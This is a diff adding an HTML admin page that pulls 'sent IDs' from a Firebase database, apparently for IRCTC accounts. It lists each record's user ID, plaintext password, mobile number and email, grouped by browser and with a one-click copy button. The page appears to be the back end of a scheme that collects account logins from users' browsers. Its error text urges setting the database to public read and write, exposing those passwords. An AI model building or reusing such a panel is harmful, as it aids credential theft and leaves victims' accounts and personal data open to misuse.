@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin - Sent IDs</title>
+<style>
+body{
+background:#eef2f5;
+font-family:Arial;
+padding:20px;
+}
+.container{
+max-width:950px;
+margin:0 auto;
+background:#fff;
+padding:20px;
+border-radius:10px;
+box-shadow:0 0 10px rgba(0,0,0,.15);
+}
+h2{text-align:center;margin-bottom:20px}
+.user-block{
+border:1px solid #ddd;
+border-radius:8px;
+margin-bottom:16px;
+overflow:hidden;
+}
+.user-header{
+background:#007bff;
+color:#fff;
+padding:12px 15px;
+font-weight:bold;
+cursor:pointer;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+.user-header:hover{background:#0069d9}
+.count-badge{
+background:#28a745;
+padding:3px 10px;
+border-radius:20px;
+font-size:13px;
+}
+.user-body{
+padding:12px 15px;
+display:none;
+background:#fafafa;
+}
+.item{
+background:#fff;
+border:1px solid #e0e0e0;
+border-radius:6px;
+padding:12px;
+margin-bottom:10px;
+font-family:monospace;
+white-space:pre-line;
+}
+.item small{color:#666;display:block;margin-top:5px}
+button{
+background:#28a745;
+color:#fff;
+border:none;
+padding:6px 12px;
+border-radius:4px;
+cursor:pointer;
+margin-top:6px;
+}
+button:hover{opacity:0.9}
+.refresh{
+background:#007bff;
+margin-bottom:15px;
+padding:10px 18px;
+}
+.total-all{
+text-align:center;
+margin-bottom:15px;
+font-size:16px;
+color:#333;
+}
+</style>
+</head>
+<body>
+<div class="container">
+<h2>Admin Panel – Sent IDs</h2>
+<button class="refresh" onclick="loadData()">Refresh</button>
+<div id="totalAll" class="total-all"></div>
+<div id="list"></div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCIqyRKXYTXNC913jDbrrC2-fk_MMRx8R0",
+  authDomain: "irctcid-e0eaa.firebaseapp.com",
+  projectId: "irctcid-e0eaa",
+  storageBucket: "irctcid-e0eaa.firebasestorage.app",
+  messagingSenderId: "422207910338",
+  appId: "1:422207910338:web:34cbb26e92c3906ffbe65b",
+  databaseURL: "https://irctcid-e0eaa-default-rtdb.asia-southeast1.firebasedatabase.app"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.loadData = async function(){
+  const list = document.getElementById("list");
+  const totalAllDiv = document.getElementById("totalAll");
+  list.innerHTML = "<p>Loading...</p>";
+  totalAllDiv.innerHTML = "";
+
+  try {
+    const snapshot = await get(ref(db, "allSent"));
+    list.innerHTML = "";
+
+    if(!snapshot.exists()){
+      list.innerHTML = "<p>No sent IDs found</p>";
+      return;
+    }
+
+    const data = snapshot.val();
+    
+    // Group by browserId
+    const grouped = {};
+    let grandTotal = 0;
+
+    Object.keys(data).forEach(time => {
+      const d = data[time];
+      const uid = d.browserId || "unknown";
+      if(!grouped[uid]) grouped[uid] = [];
+      grouped[uid].push(d);
+      grandTotal++;
+    });
+
+    totalAllDiv.innerHTML = `<b>Total IDs Sent (All Users): ${grandTotal}</b>`;
+
+    // Sort users by most sent first
+    const sortedUsers = Object.keys(grouped).sort((a,b) => grouped[b].length - grouped[a].length);
+
+    sortedUsers.forEach(browserId => {
+      const items = grouped[browserId];
+      const count = items.length;
+
+      // Sort items newest first
+      items.sort((a,b) => b.time - a.time);
+
+      const userDiv = document.createElement("div");
+      userDiv.className = "user-block";
+
+      const header = document.createElement("div");
+      header.className = "user-header";
+      header.innerHTML = `
+        <span>User: ${browserId}</span>
+        <span class="count-badge">Total: ${count}</span>
+      `;
+      header.onclick = () => {
+        const body = header.nextElementSibling;
+        body.style.display = body.style.display === "block" ? "none" : "block";
+      };
+
+      const body = document.createElement("div");
+      body.className = "user-body";
+
+      items.forEach(d => {
+        const item = document.createElement("div");
+        item.className = "item";
+        item.innerHTML = `${d.userid}
+${d.password}
+${d.mobile}
+${d.email}
+<small>${new Date(Number(d.time)).toLocaleString()}</small>`;
+
+        const copyBtn = document.createElement("button");
+        copyBtn.innerText = "Copy All";
+        copyBtn.onclick = (e) => {
+          e.stopPropagation();
+          navigator.clipboard.writeText(`${d.userid}\n${d.password}\n${d.mobile}\n${d.email}`);
+          copyBtn.innerText = "Copied!";
+          setTimeout(() => copyBtn.innerText = "Copy All", 1500);
+        };
+
+        item.appendChild(document.createElement("br"));
+        item.appendChild(copyBtn);
+        body.appendChild(item);
+      });
+
+      userDiv.appendChild(header);
+      userDiv.appendChild(body);
+      list.appendChild(userDiv);
+    });
+
+  } catch (err) {
+    console.error(err);
+    list.innerHTML = `<p style="color:red">Error: ${err.message}<br><br>
+    Firebase Rules check karo. .read: true, .write: true hona chahiye.</p>`;
+  }
+};
+
+loadData();
+</script>
+</body>
+</html>
